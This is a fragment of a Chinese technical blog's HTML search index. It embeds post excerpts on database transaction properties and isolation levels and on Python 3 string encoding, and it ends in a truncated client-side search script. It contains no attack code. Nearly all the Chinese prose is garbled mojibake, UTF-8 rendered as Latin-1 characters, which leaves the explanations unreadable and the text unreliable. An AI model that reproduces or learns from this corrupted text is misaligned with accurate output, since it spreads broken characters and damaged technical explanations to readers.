&lt;p&gt;ä¸€ä¸ªäº‹åŠ¡è¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šï¼Œä¸èƒ½åªæ‰§è¡Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œï¼Œè¿™å°±æ˜¯äº‹åŠ¡çš„åŸå­æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;äºŒ-ä¸€è‡´æ€§consistency&#34;&gt;äºŒã€ä¸€è‡´æ€§ï¼ˆconsistency)&lt;/h3&gt;
&lt;p&gt;äº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ç ´åæ•°æ®åº“æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ï¼Œä¸€ä¸ªäº‹åŠ¡åœ¨æ‰§è¡Œä¹‹å‰å’Œæ‰§è¡Œä¹‹åï¼Œæ•°æ®åº“éƒ½å¿…é¡»å¤„äºä¸€è‡´æ€§çŠ¶æ€ã€‚&lt;br&gt;
å¦‚æœæ•°æ®åº“ç³»ç»Ÿåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæ•…éšœï¼Œæœ‰äº›äº‹åŠ¡å°šæœªå®Œæˆå°±è¢«è¿«ä¸­æ–­ï¼Œè¿™äº›æœªå®Œæˆçš„äº‹åŠ¡å¯¹æ•°æ®åº“æ‰€ä½œçš„ä¿®æ”¹æœ‰ä¸€éƒ¨åˆ†å·²å†™å…¥ç‰©ç†æ•°æ®åº“ï¼Œè¿™æ˜¯æ•°æ®åº“å°±å¤„äºä¸€ç§ä¸æ­£ç¡®çš„çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¸ä¸€è‡´çš„çŠ¶æ€ã€‚&lt;br&gt;
å³åœ¨ä¸€æ¬¡è½¬è´¦è¡Œä¸ºä¸­ï¼Œè½¬è´¦å‰ä¸è½¬è´¦åèµ„é‡‘çš„æ€»å’Œä¸å˜ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸‰-éš”ç¦»æ€§isolation&#34;&gt;ä¸‰ã€éš”ç¦»æ€§ï¼ˆisolationï¼‰&lt;/h3&gt;
&lt;p&gt;äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯æŒ‡åœ¨å¹¶å‘ç¯å¢ƒä¸­ï¼Œå¹¶å‘çš„äº‹åŠ¡æ—¶ç›¸äº’éš”ç¦»çš„ï¼Œä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ä¸è¢«å…¶ä»–äº‹åŠ¡å¹²æ‰°ã€‚ä¸åŒçš„äº‹åŠ¡å¹¶å‘æ“ä½œç›¸åŒçš„æ•°æ®æ—¶ï¼Œæ¯ä¸ªäº‹åŠ¡éƒ½æœ‰å„è‡ªå®Œæˆçš„æ•°æ®ç©ºé—´ï¼Œå³ä¸€ä¸ªäº‹åŠ¡å†…éƒ¨çš„æ“ä½œåŠä½¿ç”¨çš„æ•°æ®å¯¹å…¶ä»–å¹¶å‘äº‹åŠ¡æ—¶éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„å„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½ç›¸äº’å¹²æ‰°ã€‚&lt;br&gt;
åœ¨æ ‡å‡†SQLè§„èŒƒä¸­ï¼Œå®šä¹‰äº†4ä¸ªäº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œä¸åŒçš„éš”ç¦»çº§åˆ«å¯¹äº‹åŠ¡çš„å¤„ç†ä¸åŒï¼Œåˆ†åˆ«æ˜¯ï¼šæœªæˆæƒè¯»å–ï¼Œæˆæƒè¯»å–ï¼Œå¯é‡å¤è¯»å–å’Œä¸²è¡ŒåŒ–&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;è¯»æœªæäº¤ï¼ˆRead Uncommitedï¼‰ã€‚è¯¥éš”ç¦»çº§åˆ«å…è®¸è„è¯»å–ï¼Œå…¶éš”ç¦»çº§åˆ«æœ€ä½ï¼›æ¯”å¦‚äº‹åŠ¡Aå’Œäº‹åŠ¡BåŒæ—¶è¿›è¡Œï¼Œäº‹åŠ¡Aåœ¨æ•´ä¸ªæ‰§è¡Œé˜¶æ®µï¼Œä¼šå°†æŸæ•°æ®çš„å€¼ä»1å¼€å§‹ä¸€ç›´åŠ åˆ°10ï¼Œç„¶åè¿›è¡Œäº‹åŠ¡æäº¤ï¼Œæ­¤æ—¶ï¼Œäº‹åŠ¡Bèƒ½å¤Ÿçœ‹åˆ°è¿™ä¸ªæ•°æ®é¡¹åœ¨äº‹åŠ¡Aæ“ä½œè¿‡ç¨‹ä¸­çš„æ‰€æœ‰ä¸­é—´å€¼ï¼ˆå¦‚1å˜æˆ2ï¼Œ2å˜æˆ3ç­‰ï¼‰ï¼Œè€Œå¯¹è¿™ä¸€ç³»åˆ—çš„ä¸­é—´å€¼çš„è¯»å–å°±æ˜¯æœªæˆæƒè¯»å–&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æˆæƒè¯»å–ä¹Ÿç§°ä¸ºå·²æäº¤è¯»ï¼ˆRead Commitedï¼‰ã€‚æˆæƒè¯»å–åªå…è®¸è·å–å·²ç»æäº¤çš„æ•°æ®ã€‚æ¯”å¦‚äº‹åŠ¡Aå’Œäº‹åŠ¡BåŒæ—¶è¿›è¡Œï¼Œäº‹åŠ¡Aè¿›è¡Œ+1æ“ä½œï¼Œæ­¤æ—¶ï¼Œäº‹åŠ¡Bæ— æ³•çœ‹åˆ°è¿™ä¸ªæ•°æ®é¡¹åœ¨äº‹åŠ¡Aæ“ä½œè¿‡ç¨‹ä¸­çš„æ‰€æœ‰ä¸­é—´å€¼ï¼Œåªèƒ½çœ‹åˆ°æœ€ç»ˆçš„10ã€‚å¦å¤–ï¼Œå¦‚æœè¯´æœ‰ä¸€ä¸ªäº‹åŠ¡Cï¼Œå’Œäº‹åŠ¡Aè¿›è¡Œéå¸¸ç±»ä¼¼çš„æ“ä½œï¼Œåªæ˜¯äº‹åŠ¡Cæ˜¯å°†æ•°æ®é¡¹ä»10åŠ åˆ°20ï¼Œæ­¤æ—¶äº‹åŠ¡Bä¹ŸåŒæ ·å¯ä»¥è¯»å–åˆ°20ï¼Œå³æˆæƒè¯»å–å…è®¸ä¸å¯é‡å¤è¯»å–ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯é‡å¤è¯»ï¼ˆRepeatable Read)ã€‚å°±æ˜¯ä¿è¯åœ¨äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¤šæ¬¡è¯»å–åŒä¸€ä¸ªæ•°æ®æ—¶ï¼Œå…¶å€¼éƒ½å’Œäº‹åŠ¡å¼€å§‹æ—¶åˆ»æ˜¯ä¸€è‡´çš„ï¼Œå› æ­¤è¯¥äº‹åŠ¡çº§åˆ«ç¦æ­¢ä¸å¯é‡å¤è¯»å–å’Œè„è¯»å–ï¼Œä½†æ˜¯æœ‰å¯èƒ½å‡ºç°å¹»å½±æ•°æ®ã€‚æ‰€è°“å¹»å½±æ•°æ®ï¼Œå°±æ˜¯æŒ‡åŒæ ·çš„äº‹åŠ¡æ“ä½œï¼Œåœ¨å‰åä¸¤ä¸ªæ—¶é—´æ®µå†…æ‰§è¡Œå¯¹åŒä¸€ä¸ªæ•°æ®é¡¹çš„è¯»å–ï¼Œå¯èƒ½å‡ºç°ä¸ä¸€è‡´çš„ç»“æœã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¯é‡å¤è¯»å–éš”ç¦»çº§åˆ«èƒ½å¤Ÿä¿è¯äº‹åŠ¡Båœ¨ç¬¬ä¸€æ¬¡äº‹åŠ¡æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå§‹ç»ˆå¯¹æ•°æ®é¡¹è¯»å–åˆ°1ï¼Œä½†æ˜¯åœ¨ä¸‹ä¸€æ¬¡äº‹åŠ¡æ“ä½œä¸­ï¼Œå³ä½¿äº‹åŠ¡Bï¼ˆæ³¨æ„ï¼Œäº‹åŠ¡åå­—è™½ç„¶ç›¸åŒï¼Œä½†æ˜¯æŒ‡çš„æ˜¯å¦ä¸€ä¸ªäº‹åŠ¡æ“ä½œï¼‰é‡‡ç”¨åŒæ ·çš„æŸ¥è¯¢æ–¹å¼ï¼Œå°±å¯èƒ½è¯»å–åˆ°10æˆ–20ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸²è¡ŒåŒ–ã€‚æ˜¯æœ€ä¸¥æ ¼çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œå®ƒè¦æ±‚æ‰€æœ‰äº‹åŠ¡è¢«ä¸²è¡Œæ‰§è¡Œï¼Œå³äº‹åŠ¡åªèƒ½ä¸€ä¸ªæ¥ä¸€ä¸ªçš„è¿›è¡Œå¤„ç†ï¼Œä¸èƒ½å¹¶å‘æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å››-æŒä¹…æ€§durability&#34;&gt;å››ã€æŒä¹…æ€§ï¼ˆdurabilityï¼‰&lt;/h3&gt;
&lt;p&gt;ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œé‚£ä¹ˆå®ƒå¯¹æ•°æ®åº“ä¸­çš„å¯¹åº”æ•°æ®çš„çŠ¶æ€çš„å˜æ›´å°±ä¼šæ°¸ä¹…ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚--å³ä½¿å‘ç”Ÿç³»ç»Ÿå´©æºƒæˆ–æœºå™¨å®•æœºç­‰æ•…éšœï¼Œåªè¦æ•°æ®åº“èƒ½å¤Ÿé‡æ–°å¯åŠ¨ï¼Œé‚£ä¹ˆä¸€å®šèƒ½å¤Ÿå°†å…¶æ¢å¤åˆ°äº‹åŠ¡æˆåŠŸç»“æŸçš„çŠ¶æ€&lt;/p&gt;
&lt;h2 id=&#34;å…³ç³»æ•°æ®åº“çš„ç»“æ„&#34;&gt;å…³ç³»æ•°æ®åº“çš„ç»“æ„&lt;/h2&gt;
&lt;p&gt;å…³ç³»(relation)æŒ‡ä»£è¡¨ï¼Œå…ƒç»„(tuple)æŒ‡ä»£è¡Œï¼Œå±æ€§(attribute)æŒ‡ä»£è¡¨ä¸­çš„åˆ—ã€‚&lt;br&gt;
åŸŸ(domain)æŒ‡ä¸€ä¸ªå±æ€§å…è®¸å–å€¼çš„é›†åˆã€‚&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬ä¸€ã€äºŒç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xv6m6b_wg7shu/"" data-c="
          &lt;p&gt;ä¸ºäº†å½»åº•é—¹æ˜ç™½pythonçš„ç¼–ç é—®é¢˜ï¼Œç‰¹åˆ†äº«ä¸‹æ–‡ï¼Œå¸Œæœ›å¯¹å¤§å®¶ç†Ÿæ‚‰pythonçš„ç¼–ç é—®é¢˜å¸¦æ¥äº›å¸®åŠ©&lt;/p&gt;
&lt;h3 id=&#34;1ä»å­—èŠ‚è¯´èµ·&#34;&gt;1.ä»å­—èŠ‚è¯´èµ·ï¼š&lt;/h3&gt;
&lt;p&gt;ä¸€ä¸ªå­—èŠ‚åŒ…æ‹¬å…«ä¸ªæ¯”ç‰¹ä½ï¼Œæ¯ä¸ªæ¯”ç‰¹ä½è¡¨ç¤º0æˆ–1ï¼Œä¸€ä¸ªå­—èŠ‚å³å¯è¡¨ç¤ºä»00000000åˆ°11111111å…±2^8=256ä¸ªæ•°å­—ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªASCIIç¼–ç ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚ï¼ˆé™¤å»å­—èŠ‚çš„æœ€é«˜ä½ä½œä¸ºä½œå¥‡å¶æ ¡éªŒä½ï¼‰ï¼ŒASCIIç¼–ç å®é™…ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚ä¸­çš„7ä¸ªæ¯”ç‰¹ä½æ¥è¡¨ç¤ºå­—ç¬¦ï¼Œå…±å¯è¡¨ç¤º2^7=128ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ASCIIç¼–ç ä¸­çš„01000001ï¼ˆå³åè¿›åˆ¶çš„65ï¼‰è¡¨ç¤ºå­—ç¬¦&#39;A&#39;ï¼Œ01000001åŠ ä¸Š32ä¹‹åçš„01100001ï¼ˆå³åè¿›åˆ¶çš„97ï¼‰è¡¨ç¤ºå­—ç¬¦&#39;a&#39;ã€‚ç°åœ¨æ‰“å¼€Pythonï¼Œè°ƒç”¨chrå’Œordå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Pythonä¸ºæˆ‘ä»¬å¯¹ASCIIç¼–ç è¿›è¡Œäº†è½¬æ¢ã€‚å¦‚å›¾&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/_d707b454d810593725ca3b85fd6edb6a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ª00000000è¡¨ç¤ºç©ºå­—ç¬¦ï¼Œå› æ­¤ASCIIç¼–ç å®é™…ä¸ŠåªåŒ…æ‹¬äº†  å­—æ¯ã€æ ‡ç‚¹ç¬¦å·ã€ç‰¹æ®Šç¬¦å·ç­‰å…±127ä¸ªå­—ç¬¦ã€‚å› ä¸ºASCIIæ˜¯åœ¨ç¾å›½å‡ºç”Ÿçš„ï¼Œå¯¹äºç”±å­—æ¯ç»„æˆå•è¯è¿›è€Œç”¨å•è¯è¡¨è¾¾çš„è‹±æ–‡æ¥è¯´ä¹Ÿæ˜¯å¤Ÿäº†ã€‚ä½†æ˜¯ä¸­å›½äººã€æ—¥æœ¬äººã€  éŸ©å›½äººç­‰å…¶ä»–è¯­è¨€çš„äººä¸æœäº†ã€‚ä¸­æ–‡æ˜¯ä¸€ä¸ªå­—ä¸€ä¸ªå­—ï¼ŒASCIIç¼–ç ç”¨ä¸Šäº†æµ‘èº«è§£æ•°256ä¸ªå­—ç¬¦éƒ½ä¸å¤Ÿç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤åæ¥å‡ºç°äº†Unicodeç¼–ç ã€‚Unicodeç¼–ç é€šå¸¸ç”±ä¸¤ä¸ªå­—èŠ‚ç»„æˆï¼Œå…±è¡¨ç¤º256*256ä¸ªå­—ç¬¦ï¼Œå³æ‰€è°“çš„UCS-2ã€‚æŸäº›ååƒ»å­—è¿˜ä¼šç”¨åˆ°å››ä¸ªå­—èŠ‚ï¼Œå³æ‰€è°“çš„UCS-4ã€‚ä¹Ÿå°±æ˜¯è¯´Unicodeæ ‡å‡†ä¹Ÿè¿˜åœ¨å‘å±•ã€‚ä½†UCS-4å‡ºç°çš„æ¯”è¾ƒå°‘ï¼Œæˆ‘ä»¬å…ˆè®°ä½ï¼š  æœ€åŸå§‹çš„ASCIIç¼–ç ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚ç¼–ç ï¼Œä½†ç”±äºè¯­è¨€å·®å¼‚å­—ç¬¦ä¼—å¤šï¼Œäººä»¬ç”¨ä¸Šäº†ä¸¤ä¸ªå­—èŠ‚ï¼Œå‡ºç°äº†ç»Ÿä¸€çš„ã€å›Šæ‹¬å¤šå›½è¯­è¨€çš„Unicodeç¼–ç ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Unicodeä¸­ï¼ŒåŸæœ¬ASCIIä¸­çš„127ä¸ªå­—ç¬¦åªéœ€åœ¨å‰é¢è¡¥ä¸€ä¸ªå…¨é›¶çš„å­—èŠ‚å³å¯ï¼Œæ¯”å¦‚å‰æ–‡è°ˆåˆ°çš„å­—ç¬¦â€˜a&#39;ï¼š01100001ï¼Œåœ¨Unicodeä¸­å˜æˆäº†00000000Â 01100001ã€‚ä¸ä¹…ï¼Œç¾å›½äººä¸å¼€å¿ƒäº†ï¼Œåƒä¸Šäº†ä¸–ç•Œæ°‘æ—ä¹‹æ—çš„å¤§é”…é¥­ï¼ŒåŸæœ¬åªéœ€ä¸€ä¸ªå­—èŠ‚å°±èƒ½ä¼ è¾“çš„è‹±æ–‡ç°åœ¨å˜æˆä¸¤ä¸ªå­—èŠ‚ï¼Œéå¸¸æµªè´¹å­˜å‚¨ç©ºé—´å’Œä¼ è¾“é€Ÿåº¦ã€‚&lt;br&gt;
äººä»¬å†å‘æŒ¥èªæ˜æ‰æ™ºï¼Œäºæ˜¯å‡ºç°äº†UTF-8ç¼–ç ã€‚å› ä¸ºé’ˆå¯¹çš„æ˜¯ç©ºé—´æµªè´¹é—®é¢˜ï¼Œå› æ­¤è¿™ç§ &lt;strong&gt;UTF-8ç¼–ç æ˜¯å¯å˜é•¿çŸ­çš„&lt;/strong&gt; ï¼Œä»è‹±æ–‡å­—æ¯çš„ä¸€ä¸ªå­—èŠ‚ï¼Œåˆ°ä¸­æ–‡çš„é€šå¸¸çš„ä¸‰ä¸ªå­—èŠ‚ï¼Œå†åˆ°æŸäº›ç”Ÿåƒ»å­—çš„å…­ä¸ªå­—èŠ‚ã€‚è§£å†³äº†ç©ºé—´é—®é¢˜ï¼ŒUTF-8ç¼–ç è¿˜æœ‰ä¸€ä¸ªç¥å¥‡çš„é™„åŠ åŠŸèƒ½ï¼Œé‚£å°±æ˜¯å…¼å®¹äº†è€å¤§å“¥çš„ASCIIç¼–ç ã€‚ä¸€äº›è€å¤è‘£è½¯ä»¶ç°åœ¨åœ¨UTF-8ç¼–ç ä¸­å¯ä»¥ç»§ç»­å·¥ä½œã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„é™¤äº†è‹±æ–‡å­—æ¯ç›¸åŒï¼Œæ±‰å­—åœ¨Unicodeç¼–ç å’ŒUTF-8ç¼–ç ä¸­é€šå¸¸æ˜¯ä¸åŒçš„ã€‚æ¯”å¦‚æ±‰å­—çš„â€˜ä¸­&#39;å­—åœ¨Unicodeä¸­æ˜¯01001110 00101101ï¼Œè€Œåœ¨UTF-8ç¼–ç ä¸­æ˜¯11100100 10111000 10101101ã€‚&lt;br&gt;
æˆ‘ä»¬ç¥–å›½æ¯äº²è‡ªç„¶ä¹Ÿæœ‰è‡ªå·±çš„ä¸€å¥—æ ‡å‡†ã€‚é‚£å°±æ˜¯GB2312å’ŒGBKã€‚å½“ç„¶ç°åœ¨æŒºå°‘çœ‹åˆ°ã€‚é€šå¸¸éƒ½æ˜¯ç›´æ¥ä½¿ç”¨UTF-8ã€‚&lt;/p&gt;
&lt;h3 id=&#34;2python3ä¸­çš„é»˜è®¤ç¼–ç &#34;&gt;2.Python3ä¸­çš„é»˜è®¤ç¼–ç &lt;/h3&gt;
&lt;p&gt;Python3ä¸­é»˜è®¤æ˜¯UTF-8ï¼Œæˆ‘ä»¬é€šè¿‡ä»¥ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;| 1&lt;br&gt;
2&lt;br&gt;
3 | &lt;code&gt;import&lt;/code&gt; &lt;code&gt;sys&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;code&gt;sys.getdefaultencoding()&lt;/code&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å¯æŸ¥çœ‹Python3çš„é»˜è®¤ç¼–ç ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_fffe57278779ad10247c3cb828ae3b42.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3python3ä¸­çš„encodeå’Œdecode&#34;&gt;3.Python3ä¸­çš„encodeå’Œdecode&lt;/h3&gt;
&lt;p&gt;Python3ä¸­å­—ç¬¦ç¼–ç ç»å¸¸ä¼šä½¿ç”¨åˆ°decodeå’Œencodeå‡½æ•°ã€‚ç‰¹åˆ«æ˜¯åœ¨æŠ“å–ç½‘é¡µä¸­ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ç”¨çš„ç†Ÿç»ƒéå¸¸æœ‰å¥½å¤„ã€‚encodeçš„ä½œç”¨ï¼Œä½¿æˆ‘ä»¬çœ‹åˆ°çš„ç›´è§‚çš„å­—ç¬¦è½¬æ¢æˆè®¡ç®—æœºå†…çš„å­—èŠ‚å½¢å¼ã€‚decodeåˆšå¥½ç›¸åï¼ŒæŠŠå­—èŠ‚å½¢å¼çš„å­—ç¬¦è½¬æ¢æˆæˆ‘ä»¬çœ‹çš„æ‡‚çš„ã€ç›´è§‚çš„ã€â€œäººæ¨¡äººæ ·â€çš„å½¢å¼ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_b2d471b6ceb52bb83c5bbd6cf0d4feb1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;\xè¡¨ç¤ºåé¢æ˜¯åå…­è¿›åˆ¶ï¼Œ \xe4\xb8\xadå³æ˜¯äºŒè¿›åˆ¶çš„ 11100100 10111000  10101101ã€‚ä¹Ÿå°±æ˜¯è¯´æ±‰å­—â€˜ä¸­&#39;encodeæˆå­—èŠ‚å½¢å¼ï¼Œæ˜¯ 11100100 10111000 10101101ã€‚åŒç†ï¼Œæˆ‘ä»¬æ‹¿  11100100 10111000 10101101ä¹Ÿå°±æ˜¯ \xe4\xb8\xadæ¥decodeå›æ¥ï¼Œå°±æ˜¯æ±‰å­—â€˜ä¸­&#39;ã€‚å®Œæ•´çš„åº”è¯¥æ˜¯  b&#39;\xe4\xb8\xad&#39;ï¼Œåœ¨Python3ä¸­ï¼Œ ä»¥å­—èŠ‚å½¢å¼è¡¨ç¤ºçš„å­—ç¬¦ä¸²åˆ™å¿…é¡»åŠ ä¸Š å‰ç¼€bï¼Œä¹Ÿå°±æ˜¯å†™æˆä¸Šæ–‡çš„b&#39;xxxx&#39;å½¢å¼ã€‚&lt;/p&gt;
&lt;p&gt;å‰æ–‡è¯´çš„Python3çš„é»˜è®¤ç¼–ç æ˜¯UTF-8ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒPythonå¤„ç†è¿™äº›å­—ç¬¦çš„æ—¶å€™æ˜¯ä»¥UTF-8æ¥å¤„ç†çš„ã€‚å› æ­¤ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå°±ç®—æˆ‘ä»¬é€šè¿‡encode(&#39;utf-8&#39;)ç‰¹æ„æŠŠå­—ç¬¦encodeä¸ºUTF-8ç¼–ç ï¼Œå‡ºæ¥çš„ç»“æœè¿˜æ˜¯ç›¸åŒï¼šb&#39;\xe4\xb8\xad&#39;ã€‚&lt;/p&gt;
&lt;p&gt;æ˜ç™½äº†è¿™ä¸€ç‚¹ï¼ŒåŒæ—¶æˆ‘ä»¬çŸ¥é“UTF-8å…¼å®¹ASCIIï¼Œæˆ‘ä»¬å¯ä»¥çŒœæƒ³å¤§å­¦æ—¶ç»å¸¸èƒŒè¯µçš„â€˜A&#39;å¯¹åº”ASCIIä¸­çš„65ï¼Œåœ¨è¿™é‡Œæ˜¯ä¸æ˜¯ä¹Ÿèƒ½æ­£ç¡®çš„decodeå‡ºæ¥å‘¢ã€‚åè¿›åˆ¶çš„65è½¬æ¢æˆåå…­è¿›åˆ¶æ˜¯41ï¼Œæˆ‘ä»¬å°è¯•ä¸‹ï¼š&lt;br&gt;
&lt;code&gt;b&#39;\x41&#39;.decode()&lt;/code&gt;&lt;br&gt;
ç»“æœå¦‚ä¸‹ã€‚æœç„¶æ˜¯å­—ç¬¦â€˜A&#39;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_aa0c0c5c55c0ef692eb786f0271ea145.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4python3ä¸­çš„ç¼–ç è½¬æ¢&#34;&gt;4.Python3ä¸­çš„ç¼–ç è½¬æ¢&lt;/h3&gt;
&lt;p&gt;æ®è¯´å­—ç¬¦åœ¨è®¡ç®—æœºçš„å†…å­˜ä¸­ç»Ÿä¸€æ˜¯ä»¥Unicodeç¼–ç çš„ã€‚åªæœ‰åœ¨å­—ç¬¦è¦è¢«å†™è¿›æ–‡ä»¶ã€å­˜è¿›ç¡¬ç›˜æˆ–è€…ä»æœåŠ¡å™¨å‘é€è‡³å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ç½‘é¡µå‰ç«¯çš„ä»£ç ï¼‰æ—¶ä¼šå˜æˆutf-8ã€‚ä½†å…¶å®æˆ‘æ¯”è¾ƒå…³å¿ƒæ€ä¹ˆæŠŠè¿™äº›å­—ç¬¦ä»¥Unicodeçš„å­—èŠ‚å½¢å¼è¡¨ç°å‡ºæ¥ï¼Œéœ²å‡ºå®ƒåœ¨å†…å­˜ä¸­çš„åºå±±æ­£é¢ç›®çš„ã€‚è¿™é‡Œæœ‰ä¸ªç…§å¦–é•œï¼š&lt;br&gt;
&lt;code&gt;xxxx.encode/decode(&#39;unicode-escape&#39;)&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_43823ef3ee4f02ea06e61047e424c772.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;b&#39;\u4e2d&#39;è¿˜æ˜¯b&#39;\u4e2dï¼Œä¸€ä¸ªæ–œæ è²Œä¼¼æ²¡å½±å“ã€‚åŒæ—¶å¯ä»¥ å‘ç°åœ¨shellçª—å£ä¸­ï¼Œç›´æ¥è¾“ &#39;\u4e2d&#39;å’Œè¾“å…¥b  &#39;\u4e2d&#39;.decode(&#39;unicode-escape&#39;)æ˜¯ç›¸åŒçš„ï¼Œéƒ½ä¼šæ‰“å°å‡ºæ±‰å­—â€˜ä¸­&#39;ï¼Œ åè€Œæ˜¯  &#39;\u4e2d&#39;.decode(&#39;unicode-escape&#39;)ä¼šæŠ¥é”™ã€‚è¯´æ˜  è¯´æ˜Python3ä¸ä»…æ”¯æŒUnicodeï¼Œè€Œä¸”ä¸€ä¸ªâ€˜\uxxxx&#39;æ ¼å¼çš„ Unicodeå­—ç¬¦ å¯è¢«è¾¨è¯†ä¸”è¢«ç­‰ä»·äºstrç±»å‹ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_c3eeb556dd13109688d67c6dbe8d9ce7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªUnicodeå­—èŠ‚ç ï¼Œæ€ä¹ˆå˜æˆUTF-8çš„å­—èŠ‚ç å‘¢ã€‚æ‡‚äº†ä»¥ä¸Šè¿™äº›ï¼Œç°åœ¨æˆ‘ä»¬å°±æœ‰æ€è·¯äº†ï¼Œå…ˆdecodeï¼Œå†encodeã€‚ä»£ç å¦‚ä¸‹ï¼š&lt;br&gt;
&lt;code&gt;xxx.decode(&#39;unicode-escape&#39;).encode()&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_2ef48040e010348f96e5e1fc46d796a7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æœ€åçš„æ‰©å±•&#34;&gt;æœ€åçš„æ‰©å±•&lt;/h3&gt;
&lt;p&gt;è¿˜è®°å¾—åˆšåˆšé‚£ä¸ªordå—ã€‚æ—¶ä»£å˜è¿ï¼Œè€å¤§å“¥ASCIIè¢«äººåˆå¹¶ï¼Œä½†ordè¿˜æ˜¯æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚è¯•è¯•ord(&#39;ä¸­&#39;)ï¼Œè¾“å‡ºç»“æœæ˜¯20013ã€‚20013æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬å†è¯•è¯•hex(ord(&#39;ä¸­&#39;))ï¼Œè¾“å‡ºç»“æœæ˜¯&#39;0x4e2d&#39;ï¼Œä¹Ÿå°±æ˜¯20013æ˜¯æˆ‘ä»¬åœ¨ä¸Šæ–‡è§é¢äº†æ— æ•°æ¬¡çš„x4e2dçš„åè¿›åˆ¶å€¼ã€‚è¿™é‡Œè¯´ä¸‹hexï¼Œæ˜¯ç”¨æ¥è½¬æ¢æˆåå…­è¿›åˆ¶çš„å‡½æ•°ï¼Œå­¦è¿‡å•ç‰‡æœºçš„äººå¯¹hexè‚¯å®šä¸ä¼šé™Œç”Ÿã€‚&lt;/p&gt;
">pythonä¸­çš„ç¼–ç ä¸è§£ç </a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
